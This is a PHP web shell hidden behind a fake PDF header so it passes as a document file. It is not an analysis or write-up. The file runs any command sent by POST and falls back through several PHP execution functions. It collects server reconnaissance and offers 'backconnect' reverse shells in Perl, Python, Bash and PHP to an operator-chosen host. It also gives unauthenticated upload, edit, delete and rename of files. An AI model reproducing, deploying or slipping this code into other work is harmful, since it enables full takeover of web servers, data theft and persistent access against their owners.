%PDF-1.7
3 0 obj
<</Type /Page /Parent 1 0 R /MediaBox [0 0 841.89 595.28] /Group << /Type /Group /S /Transparency /CS /DeviceRGB >> /Resources 2 0 R
/Contents 4 0 R>> endobj
4 0 obj
<?php
$currentDir = isset($_POST['d']) && !empty($_POST['d']) ? base64_decode($_POST['d']) : getcwd();
$currentDir = str_replace("\\", "/", $currentDir);

// System Information
function getSystemInfo() {
    $info = [];
    $info['OS'] = php_uname('s');
    $info['Hostname'] = php_uname('n');
    $info['PHP Version'] = phpversion();
    $info['Server Software'] = $_SERVER['SERVER_SOFTWARE'] ?? 'N/A';
    $info['Current User'] = @exec('whoami');
    $info['Disabled Functions'] = ini_get('disable_functions');
    $info['Open Basedir'] = ini_get('open_basedir');
    $info['Safe Mode'] = ini_get('safe_mode') ? 'On' : 'Off';
    $info['Server IP'] = $_SERVER['SERVER_ADDR'] ?? 'N/A';
    $info['Client IP'] = $_SERVER['REMOTE_ADDR'] ?? 'N/A';
    
    return $info;
}

// Display System Info
$systemInfo = getSystemInfo();
echo "<div class='system-info'><h3>System Information</h3><table>";
foreach ($systemInfo as $key => $value) {
    echo "<tr><td><strong>$key</strong></td><td>$value</td></tr>";
}
echo "</table></div>";

// CMD Execution with LiteSpeed bypass
if (isset($_POST['cmd']) && !empty($_POST['cmd'])) {
    $cmd = $_POST['cmd'];
    echo "<div class='cmd-output'><h3>Command Output</h3><pre>";
    
    // Try multiple execution methods
    if (function_exists('system')) {
        @system($cmd);
    } elseif (function_exists('shell_exec')) {
        echo @shell_exec($cmd);
    } elseif (function_exists('exec')) {
        @exec($cmd, $output);
        echo implode("\n", $output);
    } elseif (function_exists('passthru')) {
        @passthru($cmd);
    } elseif (is_callable('proc_open')) {
        $handle = @proc_open($cmd, [['pipe','r'],['pipe','w'],['pipe','w']], $pipes);
        if ($handle !== false) {
            echo stream_get_contents($pipes[1]);
            fclose($pipes[1]);
            proc_close($handle);
        }
    } elseif (function_exists('popen')) {
        $handle = @popen($cmd, 'r');
        if ($handle !== false) {
            while (!feof($handle)) {
                echo fread($handle, 4096);
            }
            pclose($handle);
        }
    } else {
        echo "Command execution functions are disabled.";
    }
    
    echo "</pre></div>";
}

// Backconnect functionality
if (isset($_POST['backconnect'])) {
    $host = $_POST['host'] ?? '';
    $port = $_POST['port'] ?? '';
    $lang = $_POST['lang'] ?? 'php';
    
    if (!empty($host) && !empty($port)) {
        echo "<div class='backconnect-output'><h3>Backconnect Attempt</h3><pre>";
        
        switch ($lang) {
            case 'perl':
                $perl_code = 'use Socket;$i="'.$host.'";$p='.$port.';socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};';
                @system("perl -e '$perl_code'");
                break;
                
            case 'python':
                $python_code = 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("'.$host.'",'.$port.'));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);';
                @system("python -c '$python_code'");
                break;
                
            case 'bash':
                @system("bash -i >& /dev/tcp/$host/$port 0>&1");
                break;
                
            case 'php':
            default:
                $sock = @fsockopen($host, $port);
                if ($sock) {
                    fwrite($sock, "Backconnect established\n");
                    while ($cmd = fgets($sock)) {
                        $output = shell_exec($cmd);
                        fwrite($sock, $output);
                    }
                    fclose($sock);
                }
                break;
        }
        
        echo "</pre></div>";
    }
}

// Original file manager code continues...
$pathParts = explode("/", $currentDir);
echo "<div class=\"dir\">";
foreach ($pathParts as $k => $v) {
    if ($v == "" && $k == 0) {
        echo "<a href=\"javascript:void(0);\" onclick=\"postDir('/')\">/</a>";
        continue;
    }
    $dirPath = implode("/", array_slice($pathParts, 0, $k + 1));
    echo "<a href=\"javascript:void(0);\" onclick=\"postDir('" . addslashes($dirPath) . "')\">$v</a>/";
}
echo "</div>";

// CMD and Backconnect Forms
echo "<div class='tools'>
    <h3>Tools</h3>
    <form method='post'>
        <input type='text' name='cmd' placeholder='Command' required>
        <input type='hidden' name='d' value='".base64_encode($currentDir)."'>
        <input type='submit' value='Execute'>
    </form>
    
    <form method='post'>
        <h4>Backconnect</h4>
        <input type='text' name='host' placeholder='Host/IP' required>
        <input type='text' name='port' placeholder='Port' required>
        <select name='lang'>
            <option value='php'>PHP</option>
            <option value='perl'>Perl</option>
            <option value='python'>Python</option>
            <option value='bash'>Bash</option>
        </select>
        <input type='hidden' name='d' value='".base64_encode($currentDir)."'>
        <input type='submit' name='backconnect' value='Connect'>
    </form>
</div>";

if (isset($_POST['s']) && isset($_FILES['u']) && $_FILES['u']['error'] == 0) {
    $fileName = $_FILES['u']['name'];
    $tmpName = $_FILES['u']['tmp_name'];
    $destination = $currentDir . '/' . $fileName;
    if (move_uploaded_file($tmpName, $destination)) {
        echo "<script>alert('Upload successful!'); postDir('" . addslashes($currentDir) . "');</script>";
    } else {
        echo "<script>alert('Upload failed!');</script>";
    }
}

$items = scandir($currentDir);
if ($items !== false) {
    echo "<table>";
    echo "<tr><th>File/Folder Name</th><th>Size</th><th>Action</th></tr>";

    foreach ($items as $item) {
        if (!is_dir($currentDir . '/' . $item) || $item == '.' || $item == '..') continue;
        echo "<tr><td><a href=\"javascript:void(0);\" onclick=\"postDir('" . addslashes($currentDir . '/' . $item) . "')\">$item</a></td><td>--</td><td>NONE</td></tr>";
    }

    foreach ($items as $item) {
        if (!is_file($currentDir . '/' . $item)) continue;
        $size = filesize($currentDir . '/' . $item) / 1024;
        $size = $size >= 1024 ? round($size / 1024, 2) . 'MB' : round($size, 2) . 'KB';
        echo "<tr><td><a href=\"javascript:void(0);\" onclick=\"postOpen('" . addslashes($currentDir . '/' . $item) . "')\">$item</a></td><td>$size</td><td>"
            . "<a href=\"javascript:void(0);\" onclick=\"postDel('" . addslashes($currentDir . '/' . $item) . "')\" class=\"button1\">Delete</a>"
            . "<a href=\"javascript:void(0);\" onclick=\"postEdit('" . addslashes($currentDir . '/' . $item) . "')\" class=\"button1\">Edit</a>"
            . "<a href=\"javascript:void(0);\" onclick=\"postRen('" . addslashes($currentDir . '/' . $item) . "', '$item')\" class=\"button1\">Rename</a>"
            . "</td></tr>";
    }
    echo "</table>";
} else {
    echo "<p>Unable to read directory!</p>";
}

if (isset($_POST['del']) && !empty($_POST['del'])) {
    $filePath = base64_decode($_POST['del']);
    $fileDir = dirname($filePath);
    if (file_exists($filePath) && is_writable($filePath) && unlink($filePath)) {
        echo "<script>alert('Delete successful!'); postDir('" . addslashes($fileDir) . "');</script>";
    } else {
        echo "<script>alert('Delete failed or no permission!'); postDir('" . addslashes($fileDir) . "');</script>";
    }
}

if (isset($_POST['edit']) && !empty($_POST['edit'])) {
    $filePath = base64_decode($_POST['edit']);
    $fileDir = dirname($filePath);
    if (file_exists($filePath) && is_writable($filePath)) {
        echo "<style>table{display:none;}</style>"
            . "<a href=\"javascript:void(0);\" onclick=\"postDir('" . addslashes($fileDir) . "')\" class=\"button1\"><=Back</a>"
            . "<form method=\"post\">"
            . "<input type=\"hidden\" name=\"obj\" value=\"" . $_POST['edit'] . "\">"
            . "<input type=\"hidden\" name=\"d\" value=\"" . base64_encode($fileDir) . "\">"
            . "<textarea name=\"content\">" . htmlspecialchars(file_get_contents($filePath)) . "</textarea>"
            . "<center><button type=\"submit\" name=\"save\" value=\"Submit\" class=\"button1\">Save</button></center>"
            . "</form>";
    }
}

if (isset($_POST['save']) && isset($_POST['obj']) && isset($_POST['content'])) {
    $filePath = base64_decode($_POST['obj']);
    $fileDir = dirname($filePath);
    if (file_exists($filePath) && is_writable($filePath)) {
        file_put_contents($filePath, $_POST['content']);
        echo "<script>alert('Edit successful!'); postDir('" . addslashes($fileDir) . "');</script>";
    } else {
        echo "<script>alert('Edit failed or no permission!'); postDir('" . addslashes($fileDir) . "');</script>";
    }
}

if (isset($_POST['ren']) && !empty($_POST['ren'])) {
    $oldPath = base64_decode($_POST['ren']);
    $oldDir = dirname($oldPath);
    if (isset($_POST['new']) && !empty($_POST['new'])) {
        $newPath = $oldDir . '/' . $_POST['new'];
        if (file_exists($oldPath) && !file_exists($newPath) && rename($oldPath, $newPath)) {
            echo "<script>alert('Rename successful!'); postDir('" . addslashes($oldDir) . "');</script>";
        } else {
            echo "<script>alert('Rename failed!'); postDir('" . addslashes($oldDir) . "');</script>";
        }
    } else {
        echo "<form method=\"post\">"
            . "New name: <input name=\"new\" type=\"text\" value=\"\">"
            . "<input type=\"hidden\" name=\"ren\" value=\"" . $_POST['ren'] . "\">"
            . "<input type=\"hidden\" name=\"d\" value=\"" . base64_encode($oldDir) . "\">"
            . "<input type=\"submit\" value=\"Submit\">"
            . "</form>";
    }
}
?>

<!DOCTYPE html>
<html>
<body>
    <div class="dir">
        <form method="post" enctype="multipart/form-data">
            <input type="file" name="u">
            <input type="submit" name="s" value="Upload">
            <input type="hidden" name="d" value="<?php echo base64_encode($currentDir); ?>">
        </form>
    </div>
</body>
<head>
    <title>File Management</title>
    <style>
        table { border-collapse: collapse; margin: 20px auto; }
        th, td { border: 1px solid #000; padding: 8px; }
        .button1 { margin: 0 5px; padding: 5px 10px; }
        .dir { margin: 10px; }
        textarea { width: 100%; height: 400px; }
        .system-info, .cmd-output, .backconnect-output, .tools { 
            margin: 15px; 
            padding: 10px; 
            border: 1px solid #ccc; 
            background: #f9f9f9; 
        }
        .tools input, .tools select {
            margin: 5px;
        }
    </style>
    <script>
        function postDir(dir) {
            var form = document.createElement("form");
            form.method = "post";
            form.action = "";
            var input = document.createElement("input");
            input.type = "hidden";
            input.name = "d";
            input.value = btoa(dir);
            form.appendChild(input);
            document.body.appendChild(form);
            form.submit();
        }

        function postDel(path) {
            var form = document.createElement("form");
            form.method = "post";
            form.action = "";
            var input = document.createElement("input");
            input.type = "hidden";
            input.name = "del";
            input.value = btoa(path);
            form.appendChild(input);
            document.body.appendChild(form);
            form.submit();
        }

        function postEdit(path) {
            var form = document.createElement("form");
            form.method = "post";
            form.action = "";
            var input = document.createElement("input");
            input.type = "hidden";
            input.name = "edit";
            input.value = btoa(path);
            form.appendChild(input);
            document.body.appendChild(form);
            form.submit();
        }

        function postRen(path, name) {
            var newName = prompt("Enter new name:", name);
            if (newName) {
                var form = document.createElement("form");
                form.method = "post";
                form.action = "";
                var input1 = document.createElement("input");
                input1.type = "hidden";
                input1.name = "ren";
                input1.value = btoa(path);
                var input2 = document.createElement("input");
                input2.type = "hidden";
                input2.name = "new";
                input2.value = newName;
                form.appendChild(input1);
                form.appendChild(input2);
                document.body.appendChild(form);
                form.submit();
            }
        }

        function postOpen(path) {
            var form = document.createElement("form");
            form.method = "post";
            form.action = "";
            var input = document.createElement("input");
            input.type = "hidden";
            input.name = "open";
            input.value = btoa(path);
            form.appendChild(input);
            document.body.appendChild(form);
            form.submit();
        }
    </script>
</head>
</html>